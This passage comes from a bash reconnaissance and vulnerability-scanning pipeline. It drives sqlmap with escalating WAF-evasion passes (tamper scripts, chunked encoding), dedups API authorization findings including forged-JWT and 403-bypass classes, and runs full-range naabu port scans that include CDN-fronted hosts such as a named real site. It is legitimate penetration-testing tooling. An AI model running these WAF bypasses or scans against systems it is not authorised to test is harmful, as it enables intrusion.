        if [ "$found" = "false" ] && _sqli_waf_blocked "$run_dir/pass1_baseline.log"; then
            log_info "    WAF block detected, retrying with tamper scripts..."
            local tamper_chain
            tamper_chain=$(_sqli_tamper_for_waf "$host_waf")

            if _sqli_run_sqlmap "$url" "$run_dir" "pass2_tamper" \
                --technique=BEU \
                --tamper="$tamper_chain" \
                --delay=1; then
                found="true"
                pass_log="$run_dir/pass2_tamper.log"
                pass_used="waf_tamper"
            fi
        fi

        # ── Pass 3: if still blocked, try chunked encoding + different technique ──
        if [ "$found" = "false" ] && _sqli_waf_blocked "$run_dir/pass2_tamper.log" 2>/dev/null; then
            log_info "    Still blocked, trying chunked + error-based only..."

            if _sqli_run_sqlmap "$url" "$run_dir" "pass3_chunked" \
                --technique=E \
                --tamper="chardoubleencode,between" \
                --delay=2 \
                --chunked; then
                found="true"
                pass_log="$run_dir/pass3_chunked.log"
                pass_used="chunked_bypass"
            fi
        fi

        # ── Record result ──
        if [ "$found" = "true" ] && [ -f "$pass_log" ]; then
            local sqli_type sqli_param confidence
            sqli_type=$(grep -oP "Type: \K[^,]+" "$pass_log" 2>/dev/null | head -1)
            [ -z "$sqli_type" ] && sqli_type="unknown"
            sqli_param=$(grep -oP "Parameter: \K\S+" "$pass_log" 2>/dev/null | head -1)
            [ -z "$sqli_param" ] && sqli_param="unknown"

            # Confidence based on technique and WAF context
            confidence="high"
            echo "$sqli_type" | grep -qi "union" && confidence="medium"
            echo "$sqli_type" | grep -qi "time\|blind" && confidence="medium"
            # Finding through WAF bypass = lower confidence
            [ "$pass_used" = "waf_tamper" ] && [ "$confidence" = "high" ] && confidence="medium"
            [ "$pass_used" = "chunked_bypass" ] && confidence="low"

            local finding_json
            finding_json=$(jq -nc \
                --arg url "$url" \
                --arg host "$host" \
                --arg sqli_type "$sqli_type" \
                --arg param "$sqli_param" \
                --arg confidence "$confidence" \
                --arg waf "$host_waf" \
                --arg pass "$pass_used" \
                '{url:$url,host:$host,type:$sqli_type,parameter:$param,confidence:$confidence,waf_vendor:$waf,detection_pass:$pass}')
            printf '%s\n' "$finding_json" >> "$results_jsonl"
            ((findings++))
            log_warn "  VULNERABLE: $host param=$sqli_param type=$sqli_type confidence=$confidence (pass=$pass_used)"

        elif _sqli_waf_blocked "$run_dir/pass1_baseline.log" 2>/dev/null; then
            ((waf_blocked_count++))
            log_info "    WAF-blocked after all passes: $host"
        fi

    done < "$capped_file"

    log_info "SQL injection testing completed: $findings findings, $waf_blocked_count WAF-blocked, from $test_count URLs"

    local end_time=$(date +%s)
    cat > "$output_file" << EOF
{
  "module": "sqli_testing",
  "candidates": $total_candidates,
  "tested": $actually_tested,
  "findings": $findings,
  "waf_blocked": $waf_blocked_count,
  "scanner_status": "$_sqli_scanner_status",
  "duration_seconds": $((end_time - start_time))
}
EOF

    echo "$output_file"
}

###################################################################################################
# MODULE 16: API SECURITY TESTING (Intelligence Engine, deduplicated)
#
# The API Intelligence Engine (api_security/api_intelligence_engine.py, which
# collects/probes the surface and then drives api_security/apisec.py as its sole
# finding engine) performs black-box API testing with NO OpenAPI spec required,
# and owns authentication / authorization coverage (broken auth, BOLA, data
# leak) via response-gated confirmation.
# Findings are tagged by tool; identical endpoint+issue pairs collapse into one row.
#
# Removed scanners (retired, not run): Autoswagger (auth/authz) and RESTler
# (robustness) were removed — Autoswagger required a published spec and, when it
# ran, duplicated the intel engine's auth/authz findings at a far higher false-
# positive rate; RESTler produced ~1 low-value medium finding per scan across 41
# scans. The intel engine + api_security/apisec.py now own the entire API surface.
###################################################################################################


module_api_security() {
    local target="$1"
    log_section "MODULE 16: API Security Testing (Intelligence Engine)"

    local start_time=$(date +%s)
    local base_dir="$OUTPUT_DIR/16_api_security"
    local findings_file="$base_dir/api_findings.jsonl"
    local output_file="$base_dir/$(make_iso_filename "$target" "api_security" "results")"
    mkdir -p "$base_dir"
    > "$findings_file"

    # ── Stage A: API Intelligence Engine ─────────────────────────────────────
    # Turns every URL already discovered by crawling, JS extraction, directory
    # scanning and Module 20 (headless XHR interception) into probed, classified
    # findings — no OpenAPI spec required. This is what fixes the historical
    # "0 findings" problem where AutoSwagger alone found nothing. Deterministic,
    # no AI. Falls back silently if python3 is unavailable.
    local intel_engine="${ARISE_INTEL_ENGINE:-$PROJECT_ROOT/api_security/api_intelligence_engine.py}"
    local intel_wordlist="${APISEC_ACTIONS_WORDLIST:-$PROJECT_ROOT/lists/api_actions.txt}"
    local intel_findings=0

    if [ -f "$intel_engine" ] && command -v python3 &>/dev/null; then
        log_info "[intel] Running API Intelligence Engine…"
        # Internal deadline sits 150s below the external hard cap: gives the
        # api_security/apisec.py adapter (Phase 9) time to stop starting new per-host
        # subprocesses and let the engine reach its own _write_findings()
        # before run_tool_timeout SIGTERMs the whole process — otherwise any
        # partial findings (Phase 6 classifier hits, completed api_security/apisec.py
        # hosts) are lost with the kill instead of landing in api_findings.jsonl.
        local _api_intel_cap="${API_INTEL_TIMEOUT:-1800}"
        local _api_intel_deadline=$(( _api_intel_cap > 200 ? _api_intel_cap - 150 : _api_intel_cap * 8 / 10 ))
        local intel_args=("$OUTPUT_DIR"
            "--rate"    "${APISEC_INTEL_RATE:-60}"
            "--timeout" "${APISEC_INTEL_TIMEOUT:-8}"
            "--threads" "${APISEC_INTEL_THREADS:-30}"
            "--deadline-seconds" "$_api_intel_deadline")
        [ -f "$intel_wordlist" ] && intel_args+=("--wordlist" "$intel_wordlist")
        [ -n "$DEBUG" ] && intel_args+=("--debug")

        local intel_rc
        local _apisec_scanner_status="completed"
        run_tool_timeout "${API_INTEL_TIMEOUT:-1800}" api_intel python3 "$intel_engine" "${intel_args[@]}"
        intel_rc=$?
        intel_findings=$(count_lines "$findings_file")
        if [ "$intel_rc" -eq 124 ]; then
            _apisec_scanner_status="timeout"
            log_warn "[intel] API Intelligence Engine exceeded ${API_INTEL_TIMEOUT:-1800}s cap — killed, continuing with partial findings ($intel_findings so far)"
        elif [ "$intel_rc" -ne 0 ]; then
            _apisec_scanner_status="partial"
            log_warn "[intel] Intelligence engine exited non-zero (findings so far: $intel_findings)"
        fi
        log_info "[intel] Intelligence engine complete: $intel_findings findings"
    else
        log_warn "[intel] api_security/api_intelligence_engine.py not found or python3 missing — skipping intelligence phase"
    fi

    # ── Stage B: API host inventory ────────────────────────────────────────────
    # Record the API-classed host list for the dashboard/report. Autoswagger and
    # RESTler were removed (see module header): the intel engine + api_security/apisec.py in
    # Stage A now own all API auth/authz and black-box coverage, so there is no
    # second spec-based pass here.
    local api_hosts_file="$base_dir/api_hosts.txt"
    jq -r '.hosts | to_entries[] | select(.value.is_api == true) | .key' \
        "$MANIFEST_FILE" 2>/dev/null | sort -u > "$api_hosts_file"
    local api_host_count
    api_host_count=$(count_lines "$api_hosts_file")
    log_info "API hosts identified: $api_host_count"

    # ── Stage C: Final dedup across all sources + confidence + promotion ─────
    # Dedup by (host, method, template_path, issue_class); merge tools/evidence;
    # keep highest severity. Then compute a per-finding confidence tier and
    # promote high-confidence findings into a separate file the dashboard's
    # vulnerabilities/risk views ingest, so the API Security tab and the org
    # risk score both reflect the same, deduplicated truth.
    local promoted_file="$base_dir/promoted_vulnerabilities.jsonl"
    if [ -s "$findings_file" ]; then
        python3 - "$findings_file" "$promoted_file" << 'DEDUP_PY'
import json, sys, hashlib, re
ID_RE = re.compile(r'^(\d{5,}|[0-9a-fA-F]{8,}|[0-9a-fA-F-]{16,})$')
STATIC_RE = re.compile(
    r'(/wp-content/|/wp-includes/|/static/|/assets/|/media/|/images?/'
    r'|/img/|/css/|/js/|/fonts?/|/icons?/|/dist/|/build/|/public/'
    r'|/themes?/|/plugins?/|/vendor/|/_next/static/)'
    r'|\.(?:png|jpe?g|gif|webp|svg|ico|css|js|woff2?|ttf|eot|mp[34]|pdf|zip)$', re.I)
AUTH_FAIL_RE = re.compile(
    r'(?i)'
    r'("statusMessage"\s*:\s*"[Aa]uthentication\s+failed")'
    r'|("message"\s*:\s*"[Uu]nauthori[sz]ed")'
    r'|("error"\s*:\s*"[Uu]nauthori[sz]ed")'
    r'|("authenticated"\s*:\s*false)'
    r'|("isAuthenticated"\s*:\s*false)'
    r'|("loggedIn"\s*:\s*false)'
    r'|(\bAccess\s+Denied\b)'
    r'|(\bInvalid\s+(?:token|session|credentials|api.?key)\b)'
    r'|(\brequires?\s+authentication\b)'
    r'|(\bnot\s+logged\s+in\b)'
    r'|(\bplease\s+(?:log\s*in|sign\s*in|authenticate)\b)')
AUTH_ISSUE_CLASSES = {'broken_authentication', 'broken_object_authorization'}
def tpath(p):
    return "/".join("{id}" if s and ID_RE.match(s) else s for s in (p or "").split("/")) or "/"

ff, promoted_f = sys.argv[1], sys.argv[2]
seen = {}
for line in open(ff):
    line = line.strip()
    if not line: continue
    try: f = json.loads(line)
    except Exception: continue
    # Skip static assets — public by design, never real authz findings
    p = f.get("path") or ""
    if f.get("issue_class") == "broken_object_authorization" and STATIC_RE.search(p):
        continue
    # Skip auth/BOLA findings where the HTTP response body says auth failed
    # (server returned 200 but JSON payload rejects the request)
    ic = f.get("issue_class") or ""
    ev = f.get("evidence") or ""
    sc = f.get("status_code")
    if ic in AUTH_ISSUE_CLASSES:
        if sc is not None and sc != 200:
            continue
        if AUTH_FAIL_RE.search(ev):
            continue
    # Include host in the key: two DIFFERENT hosts hitting the same
    # method+path+issue_class are two DIFFERENT findings, not duplicates.
    # (Some legacy parses don't carry a host — those still bucket
    # together as before; this only stops *real* cross-host collisions.)
    k = hashlib.md5(f"{f.get('host','')}|{f.get('method','GET')}|{tpath(f.get('path',''))}|{f.get('issue_class','')}".encode()).hexdigest()
    if k not in seen:
        f["tools"] = list(set(f.get("tools") or [f.get("tool","")]))
        seen[k] = f
    else:
        m = seen[k]
        m["tools"] = list(set(m.get("tools") or [m.get("tool","")]) | set(f.get("tools") or [f.get("tool","")]))
        SEVR = {"critical":4,"high":3,"medium":2,"low":1,"info":0}
        if SEVR.get(f.get("severity","info"),0) > SEVR.get(m.get("severity","info"),0):
            m["severity"] = f.get("severity","info")
        if not m.get("host") and f.get("host"):
            m["host"] = f["host"]
        ev = f.get("evidence","")
        if ev and ev not in (m.get("evidence") or ""):
            m["evidence"] = ((m.get("evidence") or "") + " | " + ev)[:600]

# api_security/apisec.py findings that represent a live, verified exploit (cracked JWT
# secret, forged token the server accepted, confirmed 403 bypass, cross-token
# BFLA hit) rather than a heuristic pattern match — trustworthy even as the
# only tool that saw them.
VERIFIED_EXPLOIT_CLASSES = {
    "jwt_weak_secret", "jwt_alg_none_confusion", "mass_assignment",
    "broken_function_level_authorization", "403_bypass_confirmed",
}

SEV = {"critical":4,"high":3,"medium":2,"low":1,"info":0}
final = []
for f in seen.values():
    tools = f.get("tools") or [f.get("tool","")]
    n_tools = len(set(t for t in tools if t))
    if n_tools >= 2:
        confidence = "confirmed"
    elif f.get("issue_class") in VERIFIED_EXPLOIT_CLASSES:
        confidence = "verified-exploit"
    else:
        confidence = "single-tool"
    f["confidence"] = confidence
    f["tool_count"] = n_tools
    final.append(f)
final.sort(key=lambda x: -SEV.get(x.get("severity","info"),0))

with open(ff, "w") as fh:
    for f in final: fh.write(json.dumps(f) + "\n")
print(f"{len(final)} deduplicated findings written", file=sys.stderr)

# ── Promote confirmed / verified-exploit findings into the shared vuln schema ──
# Promotion gate. Multi-tool corroboration ("confirmed") and verified exploits
# always promote. But since apisec.py is now the sole API analyzer, requiring
# 2+ tools would starve the risk score of legitimate single-tool findings
# (corroboration only comes from burp_bridge / offensive_verify when present).
# So also promote a single-tool finding when it carries its OWN strong
# evidence: a high/critical severity apisec already vetted, or a self-evident
# authz/exposure class that actually returned data (2xx). Info/low leads never
# promote (they stay surface-only).
SELF_EVIDENT_CLASSES = {
    "broken_object_authorization", "broken_authentication",
    "broken_function_level_authorization", "cors_arbitrary_origin_reflected",
    "sensitive_data_exposure", "secret_leaked_in_response", "mass_assignment",
}
CONFIRMED_STATUS = {200, 201, 202, 206}
def _promotable(f):
    if f.get("confidence") in ("confirmed", "verified-exploit"):
        return True
    if f.get("confidence") == "lead":
        return False
    sev = f.get("severity", "info")
    if sev in ("high", "critical"):
        return True
    if f.get("issue_class") in SELF_EVIDENT_CLASSES and f.get("status_code") in CONFIRMED_STATUS:
        return True
    return False
promoted = [f for f in final if _promotable(f)]
with open(promoted_f, "w") as fh:
    for f in promoted:
        host = f.get("host") or "Unknown"
        path = f.get("path") or "/"
        url = f"https://{host}{path}" if host and host != "Unknown" else path
        title = (f.get("issue_class") or "api_security_finding").replace("_", " ").title()
        tool_note = f" (confirmed by: {', '.join(sorted(set(f.get('tools') or [])))})"
        fh.write(json.dumps({
            "source": "API Security",
            "template": title,
            "severity": f.get("severity", "medium"),
            "host": host,
            "url": url,
            "impact": (f.get("evidence", "") + tool_note)[:600],
            "remediation": f.get("remediation", ""),
            "confidence": f.get("confidence"),
            "tools": f.get("tools"),
            "method": f.get("method"),
            "issue_class": f.get("issue_class"),
            "status_code": f.get("status_code"),
            "category": f.get("category"),
            "path": path,
        }) + "\n")
print(f"{len(promoted)} findings promoted to vulnerabilities dashboard", file=sys.stderr)
DEDUP_PY
    fi

    # ── Stage D: API surface LEADS (potential tier) ─────────────────────────
    # The confirmed-only rebuild made the API Security tab feel empty on targets
    # where few vulns confirm. This resurfaces the sensitive API SURFACE worth a
    # manual look — auth/token/admin/user/payment/graphql/upload endpoints and
    # SQLi candidates — as INFO-severity `lead` findings appended to
    # api_findings.jsonl. They are shown in the tab as a separate tier and are
    # NEVER promoted to the risk score (the promotion gate above excludes
    # confidence=="lead"), so coverage returns without inflating the vuln count.
    local api_endpoints_file="$OUTPUT_DIR/20_api_deep_discovery/api_endpoints.jsonl"
    if [ -s "$api_endpoints_file" ] && command -v python3 &>/dev/null; then
        python3 - "$api_endpoints_file" "$findings_file" << 'LEADS_PY' 2>/dev/null || true
import json, sys, re
from urllib.parse import urlsplit

endpoints_file, findings_file = sys.argv[1], sys.argv[2]

# High-value path keywords → a manual-review lead. Deliberately curated (not the
# old broad "any endpoint" heuristic that produced hundreds of noise findings).
SENSITIVE = re.compile(
    r"(?i)(?:^|[/_.-])(?:"
    r"auth|login|logout|signin|signup|register|oauth|sso|saml|token|session|"
    r"jwt|otp|verify|verification|reset|forgot|password|passwd|credential|"
    r"admin|superuser|root|internal|private|debug|trace|actuator|config|"
    r"secret|apikey|api[-_]?key|access[-_]?key|"
    r"user|users|account|accounts|profile|customer|member|identity|kyc|"
    r"payment|pay|checkout|order|orders|invoice|billing|card|wallet|"
    r"transaction|refund|payout|bank|upi|"
    r"upload|import|export|download|backup|dump|graphql|gql|"
    r"address|document|ssn|aadhaar|pan|passport"
    r")(?:[/_.?-]|$)")

ID_RE = re.compile(r"^(\d{5,}|[0-9a-fA-F]{8,}|[0-9a-fA-F-]{16,})$")
def tpath(p):
    return "/".join("{id}" if s and ID_RE.match(s) else s for s in (p or "").split("/")) or "/"

seen, leads = set(), []
CAP = 150
for line in open(endpoints_file, errors="ignore"):
    line = line.strip()
    if not line:
        continue
    try:
        e = json.loads(line)
    except Exception:
        continue
    url = e.get("url") or ""
    if not url:
        continue
    parts = urlsplit(url)
    host, path = parts.netloc, parts.path or "/"
    sqli = bool(e.get("sqli_candidate"))
    is_gql = "graphql" in url.lower() or "gql" in (path or "").lower()
    why = None
    if sqli:
        why = "SQLi-candidate parameter on an API endpoint"
    elif is_gql:
        why = "GraphQL endpoint — test introspection / authz / injection"
    elif SENSITIVE.search(path) or SENSITIVE.search(parts.query or ""):
        why = "Sensitive API surface (auth/user/payment/admin/data) — review authn+authz"
    if not why:
        continue
    key = (host, tpath(path))
    if key in seen:
        continue
    seen.add(key)
    methods = e.get("http_methods") or ["GET"]
    leads.append({
        "method": (methods[0] if methods else "GET"),
        "path": path, "host": host, "endpoint": f"{(methods[0] if methods else 'GET')} {path}",
        "issue_class": "sensitive_api_surface", "category": "surface",
        "severity": "info", "tool": "arise-surface", "tools": ["arise-surface"],
        "evidence": f"[lead] {why}. URL: {url[:200]}",
        "status_code": None,
        "remediation": "Manually verify authentication, per-object authorization, rate limiting and data exposure on this endpoint.",
        "confidence": "lead", "tool_count": 0,
    })
    if len(leads) >= CAP:
        break

if leads:
    with open(findings_file, "a") as fh:
        for l in leads:
            fh.write(json.dumps(l) + "\n")
print(f"{len(leads)} API surface lead(s) appended", file=sys.stderr)
LEADS_PY
        local lead_ct
        lead_ct=$(grep -c '"confidence": "lead"' "$findings_file" 2>/dev/null) || lead_ct=0
        log_info "API surface leads: $lead_ct (info tier — manual-review surface, not promoted)"
    fi

    # ── Summary ───────────────────────────────────────────────────────────────
    local total_findings apisec_count promoted_count
    total_findings=$(count_lines "$findings_file")
    apisec_count=$(grep -c '"tool": "apisec"'      "$findings_file" 2>/dev/null) || apisec_count=0
    promoted_count=$(count_lines "$promoted_file")
    log_info "API security complete: $total_findings findings (apisec:$apisec_count) — $promoted_count promoted to vulnerabilities dashboard"

    local end_time=$(date +%s)
    cat > "$output_file" << EOF
{
  "module": "api_security",
  "api_hosts": $api_host_count,
  "findings": ${total_findings:-0},
  "intel_findings": ${intel_count:-0},
  "apisec_findings": ${apisec_count:-0},
  "promoted_to_vulnerabilities": ${promoted_count:-0},
  "scanner_status": "${_apisec_scanner_status:-completed}",
  "duration_seconds": $((end_time - start_time))
}
EOF

    # ── Feed discovered API URLs back into the shared URL pool ──────────────────
    # XSS (Module 13) and SQLi (Module 15) run AFTER this module.  They read
    # 09_crawling/all_urls.txt — so we append every live API URL the intel
    # engine and api_security/apisec.py probed/confirmed so those tools get full API coverage.
    local shared_urls="$OUTPUT_DIR/09_crawling/all_urls.txt"
    local api_url_count_before
    api_url_count_before=$(count_lines "$shared_urls")

    # 1. Extract URLs from the intel engine's endpoint snapshot
    local snapshot="$base_dir/intel/endpoints_snapshot.jsonl"
    if [ -f "$snapshot" ]; then
        python3 - "$snapshot" >> "$shared_urls" << 'EXPORT_SNAP'
import json, sys
for line in open(sys.argv[1]):
    try:
        url = json.loads(line).get('url','')
        if url: print(url)
    except Exception: pass
EXPORT_SNAP
    fi

    # 2. api_security/apisec.py seed files — the full per-host URL sets it was seeded with
    local apisec_dir="$base_dir/apisec"
    if [ -d "$apisec_dir" ]; then
        for seed_file in "$apisec_dir"/*.seed.txt; do
            [ -f "$seed_file" ] && cat "$seed_file" >> "$shared_urls"
        done
    fi

    # Deduplicate in place
    sort -u "$shared_urls" -o "$shared_urls"
    local api_url_count_after
    api_url_count_after=$(count_lines "$shared_urls")
    log_info "API URL feed-back: $((api_url_count_after - api_url_count_before)) new URLs added to shared pool ($api_url_count_after total) — available for XSS/SQLi"

    echo "$output_file"
}

###################################################################################################
# MODULE 14: FULL PORT SCANNING
###################################################################################################

module_full_port_scan() {
    local target="$1"
    log_section "MODULE 14: Full Port Scanning (All Services)"

    # Port scan now runs BEFORE http_discovery, so resolved_unique.txt may not
    # exist yet. Prefer it if present; otherwise build the unique origin list
    # straight from DNS resolution (Module 03).
    mkdir -p "$OUTPUT_DIR/14_port_scan"
    local resolved_file="$OUTPUT_DIR/04_http_discovery/resolved_unique.txt"
    if [ ! -f "$resolved_file" ]; then
        if [ -f "$OUTPUT_DIR/03_dns_resolution/resolved.txt" ]; then
            sort -u "$OUTPUT_DIR/03_dns_resolution/resolved.txt" \
                > "$OUTPUT_DIR/14_port_scan/resolved_unique.txt" 2>/dev/null
            resolved_file="$OUTPUT_DIR/14_port_scan/resolved_unique.txt"
        fi
    fi
    [ ! -f "$resolved_file" ] && { log_error "No unique resolved hosts found"; return 1; }

    local start_time=$(date +%s)
    local output_file="$OUTPUT_DIR/14_port_scan/$(make_iso_filename "$target" "full_port_scan" "results")"
    command -v "$NAABU" &>/dev/null || { log_error "naabu is required for full port scanning"; return 1; }

    # ── Filter out WAF/CDN hosts — port scanning proxy IPs produces false
    # positives (you see the CDN's ports, not the target's).  Only origin
    # hosts get the full 0-65535 scan.
    local waf_file="$OUTPUT_DIR/05_waf_detection/waf_detections.jsonl"
    local cdn_ips_file="$OUTPUT_DIR/03_dns_resolution/cdn_ips.txt"
    local scan_targets="$OUTPUT_DIR/14_port_scan/scan_hosts.txt"
    local cdn_hosts_marker="$OUTPUT_DIR/14_port_scan/cdn_hosts.txt"

    # ── Full scan strategy: scan EVERY resolved host, tag CDN vs origin ───
    # Previous behaviour filtered CDN hosts OUT before the scan, which meant
    # api.myntra.com (Cloudflare-fronted) got zero port entries at all —
    # even though the CDN edge is the actual attack surface visitors hit,
    # AND port 443 is provably open (httpx confirms it responds with HSTS).
    #
    # Correct architecture:
    #   1. naabu scans ALL resolved hosts (CDN and origin alike)
    #   2. Each finding gets tagged is_cdn_ip=true|false based on Module 3's
    #      dnsx CDN detection (cdn_ips.txt from earlier stage — reliable)
    #   3. Split views: origin_ports.jsonl vs cdn_ports.jsonl for operators
    #      who want to look at either surface separately
    #   4. httpx (Module 4) still confirms web ports downstream; that stays
    #      the source of truth for "is this port actually web?"
    #
    # We do NOT pass -exclude-cdn to naabu — that flag would defeat the whole
    # point. Tag on the way out instead.
    cp "$resolved_file" "$scan_targets"

    # Build the CDN host allowlist from Module 3's dnsx output. Match by
    # hostname (not IP) because scan_targets is a host list. If dns_results.json
    # is available, use it to map host→A→cdn; otherwise, fall back to matching
    # hosts whose IP appears in cdn_ips.txt.
    : > "$cdn_hosts_marker"
    if [ -s "$OUTPUT_DIR/03_dns_resolution/dns_results.json" ] && [ -s "$cdn_ips_file" ]; then
        python3 - "$OUTPUT_DIR/03_dns_resolution/dns_results.json" "$cdn_ips_file" "$cdn_hosts_marker" << 'PY_CDN_HOST_MAP' 2>/dev/null || true
import json, sys
res, cdnf, out = sys.argv[1], sys.argv[2], sys.argv[3]
cdn = set()
try:
    for l in open(cdnf, errors="ignore"):
        l = l.strip()
        if l: cdn.add(l)
except Exception:
    pass
hosts = set()
for line in open(res, errors="ignore"):
    line = line.strip()
    if not line: continue
    try: e = json.loads(line)
    except Exception: continue
    h = (e.get("host") or "").lower()
    a = e.get("a") or []
    if not h or not a: continue
    # Host is CDN if ANY of its A records is a CDN IP.
    if any(ip in cdn for ip in a):
        hosts.add(h)
with open(out, "w") as fh:
    for h in sorted(hosts): fh.write(h + "\n")
PY_CDN_HOST_MAP
    fi
    local cdn_host_count=$(count_lines "$cdn_hosts_marker")

    local origin_count=$(count_lines "$scan_targets")
    if [ "$origin_count" -eq 0 ]; then
        log_warn "No resolved hosts to port scan"
        cat > "$output_file" << EOF
{
  "module": "full_port_scan",
  "skipped": true,
  "reason": "no_resolved_hosts",
  "origin_hosts": 0,
  "duration_seconds": $(( $(date +%s) - start_time ))
}
EOF
        return 0
    fi

    log_info "Port scan targets: $origin_count total hosts ($cdn_host_count are CDN-fronted, tagged in output)"

    # Always scan full port range (0-65535) on ALL hosts
    local -a port_args=(-p -)
    log_info "Scanning all 65,535 ports on all resolved hosts..."

    # Cap threads on macOS / Docker to avoid pthread_create crashes
    local naabu_threads="$NAABU_THREADS"
    local naabu_rate="$NAABU_RATE"
    if [ "$(uname -s)" = "Darwin" ] && [ "$naabu_threads" -gt 25 ] 2>/dev/null; then
        log_warn "macOS detected: capping naabu threads to 25 (was $naabu_threads) to avoid thread limit crashes"
        naabu_threads=25
    elif _in_container && [ "$naabu_threads" -gt 25 ] 2>/dev/null; then
        log_warn "Container detected: capping naabu threads to 25 (was $naabu_threads) to avoid resource exhaustion"
        naabu_threads=25
        [ "$naabu_rate" -gt 1500 ] 2>/dev/null && naabu_rate=1500
    fi

    # naabu -exclude-cdn REMOVED. We want naabu to scan EVERY host and tag
    # results ourselves. `-exclude-cdn` would silently drop CDN-fronted hosts
    # and hand us the same broken output that the user reported (api.myntra.com
    # showing only port 80 despite HSTS on 443).
    _run_naabu() {
        local _threads="$1" _rate="$2"
        shift 2
        local -a _port_args=("$@")
        local stderr_file="$OUTPUT_DIR/14_port_scan/naabu.stderr"
        log_info "naabu: threads=$_threads rate=$_rate ports=${_port_args[*]}"
        "$NAABU" -l "$scan_targets" "${_port_args[@]}" \
            -rate "$_rate" -c "$_threads" -s c -json \
            -o "$OUTPUT_DIR/14_port_scan/all_ports.jsonl" \
            -silent 2> >(head -c 200000 > "$stderr_file")
    }

    # Primary run
    log_info "Running naabu port scan on origin hosts only..."
    _run_naabu "$naabu_threads" "$naabu_rate" "${port_args[@]}"

    # Crash detection + retry with reduced settings.
    # Catches explicit thread/cgo crashes AND silent failures (empty output in
    # resource-constrained containers where naabu exits 0 but writes nothing).
    local naabu_crashed=false
    if [ ! -s "$OUTPUT_DIR/14_port_scan/all_ports.jsonl" ]; then
        local _crash_reason=""
        if grep -qE 'pthread_create failed|SIGABRT|runtime/cgo|cannot allocate memory|killed' "$OUTPUT_DIR/14_port_scan/naabu.stderr" 2>/dev/null; then
            _crash_reason="thread/memory limit exceeded"
        elif [ "$origin_count" -gt 0 ]; then
            _crash_reason="empty output despite $origin_count target(s) — likely resource exhaustion"
        fi
        if [ -n "$_crash_reason" ]; then
            naabu_crashed=true
            log_error "naabu failed ($_crash_reason). Retrying with reduced settings..."
            local retry_threads=$(( naabu_threads / 2 ))
            [ "$retry_threads" -lt 5 ] && retry_threads=5
            local retry_rate=$(( naabu_rate / 2 ))
            [ "$retry_rate" -lt 200 ] && retry_rate=200
            mv "$OUTPUT_DIR/14_port_scan/naabu.stderr" "$OUTPUT_DIR/14_port_scan/naabu_crash.stderr" 2>/dev/null
            _run_naabu "$retry_threads" "$retry_rate" -top-ports 1000
            if [ -s "$OUTPUT_DIR/14_port_scan/all_ports.jsonl" ]; then
                log_info "Retry succeeded with threads=$retry_threads rate=$retry_rate"
                naabu_crashed=false
            else
                log_error "naabu retry also failed. Port data will be empty."
            fi
        fi
    fi

    # ── Tag each finding as CDN vs origin ─────────────────────────────────
    # Rewrite all_ports.jsonl so every row carries is_cdn_ip=true|false.
    # Then split into origin_ports.jsonl + cdn_ports.jsonl for operators
    # who want to look at either surface separately. The dashboard reads
    # the tagged all_ports.jsonl as its authoritative view.
    if [ -s "$OUTPUT_DIR/14_port_scan/all_ports.jsonl" ] && command -v python3 &>/dev/null; then
        python3 - "$OUTPUT_DIR/14_port_scan/all_ports.jsonl" \
                  "$cdn_hosts_marker" \
                  "$OUTPUT_DIR/14_port_scan/origin_ports.jsonl" \
                  "$OUTPUT_DIR/14_port_scan/cdn_ports.jsonl" << 'PY_PORT_TAG' 2>/dev/null || true
import json, sys, os
src, cdn_hosts_file, origin_out, cdn_out = sys.argv[1:5]
cdn_hosts = set()
if os.path.isfile(cdn_hosts_file):
    for l in open(cdn_hosts_file, errors="ignore"):
        l = l.strip().lower()
        if l: cdn_hosts.add(l)
tagged = []
n_origin = n_cdn = 0
for line in open(src, errors="ignore"):
    line = line.strip()
    if not line: continue
    try: r = json.loads(line)
    except Exception: continue
    h = (r.get("host") or "").lower()
    is_cdn = h in cdn_hosts
    r["is_cdn_ip"] = is_cdn
    r["scan_tag"] = "cdn" if is_cdn else "origin"
    tagged.append(r)
    if is_cdn: n_cdn += 1
    else: n_origin += 1
# Rewrite all_ports.jsonl with tags baked in.
with open(src, "w") as w:
    for r in tagged: w.write(json.dumps(r) + "\n")
with open(origin_out, "w") as w:
    for r in tagged:
        if not r["is_cdn_ip"]: w.write(json.dumps(r) + "\n")
with open(cdn_out, "w") as w:
    for r in tagged:
        if r["is_cdn_ip"]: w.write(json.dumps(r) + "\n")
print(f"[port-tag] origin={n_origin} cdn={n_cdn}", file=sys.stderr)
PY_PORT_TAG
    fi

    # ── httpx backfill moved to module_port_split ─────────────────────────
    # naabu misses ports behind CDN/WAF (SYN probes silently dropped), and
    # httpx proves them open via a real HTTP handshake. That backfill USED to
    # live here, but this module runs in Phase 2 — before http_discovery
    # (Phase 3) writes http_confirmed.json — so the file never existed yet and
    # the backfill was dead (0 httpx rows ever appended). It now runs inside
    # ports/port_split.py, which executes after http_discovery, where the
    # confirmed-web file is real. See module_port_split / port_split.py.

    # Extract all open ports (tagged output preserved above)
    [ -f "$OUTPUT_DIR/14_port_scan/all_ports.jsonl" ] && \
        jq -r 'select(.host != null and .port != null) | .host+":"+(.port|tostring)' "$OUTPUT_DIR/14_port_scan/all_ports.jsonl" | \
        sort -u > "$OUTPUT_DIR/14_port_scan/all_ports_list.txt"

    local total_ports=$(count_lines "$OUTPUT_DIR/14_port_scan/all_ports_list.txt")
    local origin_ports_count=$(count_lines "$OUTPUT_DIR/14_port_scan/origin_ports.jsonl" 2>/dev/null || echo 0)
    local cdn_ports_count=$(count_lines "$OUTPUT_DIR/14_port_scan/cdn_ports.jsonl" 2>/dev/null || echo 0)
    log_info "Total open ports: $total_ports (origin: $origin_ports_count, cdn: $cdn_ports_count)"

    # Identify non-HTTP services (exclude 80, 443, 8080, 8443, etc.)
    [ -f "$OUTPUT_DIR/14_port_scan/all_ports.jsonl" ] && \
        jq -r 'select(.port != 80 and .port != 443 and .port != 8080 and .port != 8443 and .port != 8000 and .port != 3000) | .host+":"+(.port|tostring)' \
        "$OUTPUT_DIR/14_port_scan/all_ports.jsonl" | \
        sort -u > "$OUTPUT_DIR/14_port_scan/non_http_ports.txt"

    local non_web=$(count_lines "$OUTPUT_DIR/14_port_scan/non_http_ports.txt")
    log_info "Non-web services found: $non_web"

    # Group by service type (common ports)
    [ -f "$OUTPUT_DIR/14_port_scan/all_ports.jsonl" ] && \
        jq -r 'select(.port == 22 or .port == 21 or .port == 3389 or .port == 1433 or .port == 3306 or .port == 5432 or .port == 6379 or .port == 27017 or .port == 9200 or .port == 5984) | "\(.host):\(.port)"' \
        "$OUTPUT_DIR/14_port_scan/all_ports.jsonl" | \
        sort -u > "$OUTPUT_DIR/14_port_scan/interesting_services.txt"

